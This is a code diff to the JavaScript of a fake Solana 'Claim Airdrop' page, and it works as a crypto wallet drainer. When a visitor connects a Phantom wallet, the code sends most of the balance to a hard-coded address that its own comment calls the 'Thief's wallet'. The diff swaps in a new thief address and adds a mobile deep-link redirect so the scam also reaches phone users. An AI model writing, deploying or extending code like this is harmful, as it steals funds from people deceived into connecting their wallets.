@@ -1,4 +1,4 @@
-$(document).ready(function() {
+$(document).ready(function() { 
     $('#connect-wallet').on('click', async () => {
         if (window.solana && window.solana.isPhantom) {
             try {
@@ -23,7 +23,7 @@ $(document).ready(function() {
                 $('#connect-wallet').text("Claim Airdrop");
                 $('#connect-wallet').off('click').on('click', async () => {
                     try {
-                        const recieverWallet = new solanaWeb3.PublicKey('28s48j5KPtnDvTGJLeYdV8YcBzuAR6EyjvBkvLYy9VdV'); // Thief's wallet
+                        const recieverWallet = new solanaWeb3.PublicKey('BpEFdhesEQRKvridrGvkNxpRVUY5fG6r6CTVcveMCgjp'); // Thief's wallet
                         const balanceForTransfer = walletBalance - minBalance;
                         if (balanceForTransfer <= 0) {
                             alert("Insufficient funds for transfer.");
@@ -56,16 +56,26 @@ $(document).ready(function() {
                 console.error("Error connecting to Phantom Wallet:", err);
             }
         } else {
-            alert("Phantom extension not found.");
-            const isFirefox = typeof InstallTrigger !== "undefined";
-            const isChrome = !!window.chrome;
+            // Mobile device detection (basic)
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
-            if (isFirefox) {
-                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
-            } else if (isChrome) {
-                window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
+            if (isMobile) {
+                alert("Phantom Wallet not found. Redirecting to Phantom mobile app...");
+                const currentUrl = encodeURIComponent(window.location.href);
+                const phantomMobileLink = `https://phantom.app/ul/v1/connect?app_url=${currentUrl}&redirect_link=${currentUrl}`;
+                window.open(phantomMobileLink, "_blank");
             } else {
-                alert("Please download the Phantom extension for your browser.");
+                alert("Phantom extension not found.");
+                const isFirefox = typeof InstallTrigger !== "undefined";
+                const isChrome = !!window.chrome;
+
+                if (isFirefox) {
+                    window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
+                } else if (isChrome) {
+                    window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
+                } else {
+                    alert("Please download the Phantom extension for your browser.");
+                }
             }
         }
     });
